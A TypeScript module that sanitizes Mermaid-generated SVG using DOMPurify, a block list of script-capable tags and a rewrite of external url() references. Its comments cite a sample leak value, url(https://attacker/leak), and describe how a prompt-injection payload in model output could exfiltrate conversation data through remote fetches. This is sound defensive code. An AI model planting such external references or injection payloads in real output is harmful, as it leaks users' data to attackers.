import DOMPurify from "dompurify";

/**
 * Elements that either execute script or pull in a remote document. Mermaid
 * never needs them to draw a diagram, and `foreignObject` in particular is how
 * arbitrary HTML gets back into an SVG.
 */
const FORBIDDEN_TAGS = [
  "script",
  "foreignobject",
  "iframe",
  "embed",
  "object",
  "image",
  "use",
  "a",
  "feimage",
  "animate",
  "animatetransform",
  "animatemotion",
  "set",
  "handler",
  "listener",
  "audio",
  "video",
  "link",
  "meta",
  "base",
];

/** Attributes that address another document rather than a node in this one. */
const REFERENCE_ATTRIBUTES = ["href", "xlink:href", "src"];

function isFragmentReference(value: string): boolean {
  return value.trim().startsWith("#");
}

/**
 * Rewrites `url(...)` so only same-document fragments survive. Mermaid's own
 * references are all fragments (`url(#arrowhead)`), while diagram source can
 * reach paint values through mermaid's `style` and `classDef` statements, so a
 * fill of `url(https://attacker/leak)` is reachable from untrusted input.
 *
 * DOMPurify cannot do this part: its `ALLOWED_URI_REGEXP` is applied to every
 * attribute value, so a fragment-only pattern would also strip ordinary
 * geometry such as `d="M0,0 L10,10"`.
 */
export function stripExternalUrlReferences(value: string): string {
  return value.replace(/url\(\s*(['"]?)([^'")]*)\1\s*\)/gi, (match, _quote, reference: string) =>
    isFragmentReference(reference) ? match : "none",
  );
}

function hardenReferences(root: Element | DocumentFragment): void {
  for (const styleEl of root.querySelectorAll("style")) {
    styleEl.textContent = stripExternalUrlReferences(styleEl.textContent ?? "");
  }

  for (const el of root.querySelectorAll("*")) {
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();

      if (REFERENCE_ATTRIBUTES.includes(name) && !isFragmentReference(attr.value)) {
        el.removeAttribute(attr.name);
        continue;
      }

      if (attr.value.toLowerCase().includes("url(")) {
        el.setAttribute(attr.name, stripExternalUrlReferences(attr.value));
      }
    }
  }
}

/**
 * Sanitizes SVG markup produced by mermaid before it is inserted into the
 * document.
 *
 * Diagram source arrives in agent/model output, which is untrusted: it can be
 * shaped by repository contents, tool results, or a prompt-injection payload.
 * Mermaid's `securityLevel: "strict"` covers labels and click handlers, but it
 * is a rendering option rather than an output guarantee, so the generated SVG
 * is filtered here as well. Blocking external references matters beyond script
 * execution: an image or paint server fetched from an attacker-controlled URL
 * leaks the fact and timing of the conversation, and can carry data in the
 * path.
 */
export function sanitizeMermaidSvg(svg: string): string {
  const fragment = DOMPurify.sanitize(svg, {
    USE_PROFILES: { svg: true, svgFilters: true },
    FORBID_TAGS: FORBIDDEN_TAGS,
    ALLOW_DATA_ATTR: false,
    ALLOW_UNKNOWN_PROTOCOLS: false,
    RETURN_DOM_FRAGMENT: true,
  });

  hardenReferences(fragment);

  const serializer = new XMLSerializer();
  return Array.from(fragment.childNodes)
    .map((node) => serializer.serializeToString(node))
    .join("");
}
